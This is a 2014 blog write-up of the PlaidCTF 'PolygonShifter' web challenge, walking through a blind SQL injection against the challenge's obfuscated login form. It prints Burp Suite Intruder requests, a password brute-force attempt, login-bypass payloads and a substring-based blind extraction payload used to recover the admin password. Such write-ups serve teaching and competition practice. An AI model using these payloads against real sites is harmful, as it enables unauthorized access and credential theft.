---
id: 1877
title: 'PlaidCTF writeup for Web-100 (blind sql injection)'
date: '2014-04-16T00:43:29-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'https://blog.skullsecurity.org/2014/1873-revision-v1'
permalink: '/?p=1877'
---

Hey folks,

I know in my last blog I promised to do a couple exploit ones instead of doing boring Web stuff. But, this level was really easy and I still wanted to do a writeup, so you're just going to have to wait a little while longer for my 'kappa' writeup!

This 100-point Web challenge, called PolygonShifter, basically added some anti-bot defenses to a Web site by obfuscating the username/password field names, as well as the action for the POST request. When you visited the page, you'd see something like this:

```

<span class="htmlTag"><</span><span class="htmlTagName">form</span><span class="htmlTag"> </span><span class="htmlArg">action</span><span class="htmlTag">=</span><span class="Constant">"/S1tl90gme2GJ67epbZz9"</span><span class="htmlTag"> </span><span class="htmlArg">method</span><span class="htmlTag">=</span><span class="Constant">"POST"</span><span class="htmlTag">></span>
    <span class="htmlTag"><</span><span class="htmlTagName">label</span><span class="htmlTag"> </span><span class="htmlArg">for</span><span class="htmlTag">=</span><span class="Constant">""</span><span class="htmlTag"> </span><span class="htmlArg">style</span><span class="htmlTag">=</span><span class="Constant">"text-align:left;"</span><span class="htmlTag">></span>Username<span class="htmlEndTag"></</span><span class="htmlTagName">label</span><span class="htmlEndTag">></span>
    <span class="htmlTag"><</span><span class="htmlTagName">input</span><span class="htmlTag"> </span><span class="htmlArg">type</span><span class="htmlTag">=</span><span class="Constant">"text"</span><span class="htmlTag"> </span><span class="htmlArg">id</span><span class="htmlTag">=</span><span class="Constant">"lK1TFqrcp3fvIRSg8V7T"</span><span class="htmlTag"> </span><span class="htmlArg">name</span><span class="htmlTag">=</span><span class="Constant">"L1UIVbxzFD8wUUo8SaJH"</span><span class="htmlTag">></span>
    <span class="htmlTag"><</span><span class="htmlTagName">label</span><span class="htmlTag"> </span><span class="htmlArg">for</span><span class="htmlTag">=</span><span class="Constant">"LkW7Ye9ItPb8CGeKZrMU"</span><span class="htmlTag"> </span><span class="htmlArg">style</span><span class="htmlTag">=</span><span class="Constant">"text-align:left;"</span><span class="htmlTag">></span>Password<span class="htmlEndTag"></</span><span class="htmlTagName">label</span><span class="htmlEndTag">></span>
    <span class="htmlTag"><</span><span class="htmlTagName">input</span><span class="htmlTag"> </span><span class="htmlArg">type</span><span class="htmlTag">=</span><span class="Constant">"password"</span><span class="htmlTag"> </span><span class="htmlArg">id</span><span class="htmlTag">=</span><span class="Constant">"LkW7Ye9ItPb8CGeKZrMU"</span><span class="htmlTag"> </span><span class="htmlArg">name</span><span class="htmlTag">=</span><span class="Constant">"LmmURBa3S5NRYBwzHXhC"</span><span class="htmlTag">></span>
    <span class="htmlTag"><</span><span class="htmlTagName">input</span><span class="htmlTag"> </span><span class="htmlArg">class</span><span class="htmlTag">=</span><span class="Constant">"primary large"</span><span class="htmlTag"> </span><span class="htmlArg">type</span><span class="htmlTag">=</span><span class="Constant">"submit"</span><span class="htmlTag"> </span><span class="htmlArg">value</span><span class="htmlTag">=</span><span class="Constant">"Login"</span><span class="htmlTag">></span>
<span class="htmlEndTag"></</span><span class="htmlTagName">form</span><span class="htmlEndTag">></span>
```

I immediately installed the 'httparty' gem and started writing a solution in ruby, when I had an inspiration. I tried using the same action multiple times, and it worked! It would only work for a few minutes before I had to refresh and get a new one. But, that was enough!

I decided—incorrectly—that this was likely a brute-force level, so I fired up Burp Suite, chose 'Intruder' mode, and set it to something like:

```

<span class="Identifier">POST /im6Kh1pOKr7Y9bbDHiew HTTP/1.0</span>
<span class="Identifier">Host</span><span class="Normal">:</span><span class="Constant"> 54.204.80.192</span>
<span class="Identifier">User-Agent</span><span class="Normal">:</span><span class="Constant"> Mozilla/5.0 (X11; Linux x86_64; rv</span><span class="Normal">:</span><span class="Constant">17</span>.0) Gecko/20100101 Firefox/17.0
<span class="Identifier">Accept</span><span class="Normal">:</span><span class="Constant"> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="Identifier">Accept-Language</span><span class="Normal">:</span><span class="Constant"> en-US,en;q=0.5</span>
<span class="Identifier">Accept-Encoding</span><span class="Normal">:</span><span class="Constant"> gzip, deflate</span>
<span class="Identifier">DNT</span><span class="Normal">:</span><span class="Constant"> 1</span>
<span class="Identifier">Proxy-Connection</span><span class="Normal">:</span><span class="Constant"> keep-alive</span>
<span class="Identifier">Referer</span><span class="Normal">:</span><span class="Constant"> http</span><span class="Normal">:</span>//54.204.80.192/example
<span class="Identifier">Cookie</span><span class="Normal">:</span><span class="Constant"> resolution=1920; session=.eJxdzc0OwTAAAOBXkZ4dSkJC4kDaSYSOTruuF2nXonSz2GR-4t2JC_YAX74HUGnlTvlm66w3YPgALQ2GQMWwG3V31xQP5unByDCeOYr3hRTpCDzboFBlWZ_OpsFoRpSZBlLGsI4wqw3yjvEAccz-mfuapEMEQZNQI3-LkS8iQW5RzvtruPiYS2nPucpso7JHWoXBqrPwFGvEe5r7jN2JVIj9s5_KwCpZ-TEMp2RP2ZXqO1laQZ0Wyds8Xxv7V7E.Bix5uQ.vhQP7hI43dgozvUAVyBF7MM6C9E</span>
<span class="Identifier">Content-Type</span><span class="Normal">:</span><span class="Constant"> application/x-www-form-urlencoded</span>
<span class="Identifier">Content-Length</span><span class="Normal">:</span><span class="Constant"> 56</span>

<span class="Identifier">zDm8T52TDl5ymYfS3Yh5=admin&FcZtaYem0HE0t9bQQCTE=§password§</span>
```

Then I used Burp Suite's built-in list of passwords to attack the account.

I let the attack run through the ~1000 or so passwords, then added a filter for 'Hello, ' (in order to find good attempts). There weren't any. Damnit, now I need a new plan!

...then, on a random inspiration, I tried an invert search for 'Wrong password'. And there was one entry: a password containing a single quote returned "An error occurred" instead of "Wrong password". \*facepalm\*, it's sql injection!

So, I tried logging in with:

- Username :: admin
- Password :: ' or 1=1--

And immediately, I'm logged in... as 'test'. Derp!

So I changed my credentials to:

- Username :: admin
- Password :: ' or username='admin'--

(Don't forget to put a space after the '--' if you're following along!)

And boom! I'm logged in as 'admin'! Finished, right? WRONG! The banner says: "Hello, admin!! My password is the flag!"

Now, it sounds like I need to recover admin's password. CHALLENGE. ACCEPTED.

I threw together a quick Burp Suite Intruder attack that looked like:

```

<span class="Identifier">POST /im6Kh1pOKr7Y9bbDHiew HTTP/1.0</span>
<span class="Identifier">Host</span><span class="Normal">:</span><span class="Constant"> 54.204.80.192</span>
<span class="Identifier">User-Agent</span><span class="Normal">:</span><span class="Constant"> Mozilla/5.0 (X11; Linux x86_64; rv</span><span class="Normal">:</span><span class="Constant">17</span>.0) Gecko/20100101 Firefox/17.0
<span class="Identifier">Accept</span><span class="Normal">:</span><span class="Constant"> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="Identifier">Accept-Language</span><span class="Normal">:</span><span class="Constant"> en-US,en;q=0.5</span>
<span class="Identifier">Accept-Encoding</span><span class="Normal">:</span><span class="Constant"> gzip, deflate</span>
<span class="Identifier">DNT</span><span class="Normal">:</span><span class="Constant"> 1</span>
<span class="Identifier">Proxy-Connection</span><span class="Normal">:</span><span class="Constant"> keep-alive</span>
<span class="Identifier">Referer</span><span class="Normal">:</span><span class="Constant"> http</span><span class="Normal">:</span>//54.204.80.192/example
<span class="Identifier">Cookie</span><span class="Normal">:</span><span class="Constant"> resolution=1920; session=.eJxdzc0OwTAAAOBXkZ4dSkJC4kDaSYSOTruuF2nXonSz2GR-4t2JC_YAX74HUGnlTvlm66w3YPgALQ2GQMWwG3V31xQP5unByDCeOYr3hRTpCDzboFBlWZ_OpsFoRpSZBlLGsI4wqw3yjvEAccz-mfuapEMEQZNQI3-LkS8iQW5RzvtruPiYS2nPucpso7JHWoXBqrPwFGvEe5r7jN2JVIj9s5_KwCpZ-TEMp2RP2ZXqO1laQZ0Wyds8Xxv7V7E.Bix5uQ.vhQP7hI43dgozvUAVyBF7MM6C9E</span>
<span class="Identifier">Content-Type</span><span class="Normal">:</span><span class="Constant"> application/x-www-form-urlencoded</span>
<span class="Identifier">Content-Length</span><span class="Normal">:</span><span class="Constant"> 53</span>

<span class="Identifier">zDm8T52TDl5ymYfS3Yh5=admin&FcZtaYem0HE0t9bQQCTE=%27+or+%28username%3D%27admin%27+and+binary+substring%28password%2C+§1§%2C+1%29+%3D+%27§a§%27%29--+</span>
```

To clean it up, it's basically:

- Username :: admin
- Password :: ' or (username='admin' and binary substring(password, $1, 1) = '$2')

(Where $1 and $2 are Burp Suite's marked fields)

Then I set Burp Suite to use a 'Cluster Bomb' style of attack, which means that each field has its own set of values that are tried. Then I set the two variables to:

- $1 :: numeric, 1 - 45 (I had to keep expanding this since the password was 30+ characters long!)
- $2 :: custom set, a-z A-Z 0-9 + symbols

Then I let it run, filtered for 'Hello', and got the following results:

![](https://blogdata.skullsecurity.org/polygonshifter-solution.png)

Boom! Arrange those properly and you have your password. :)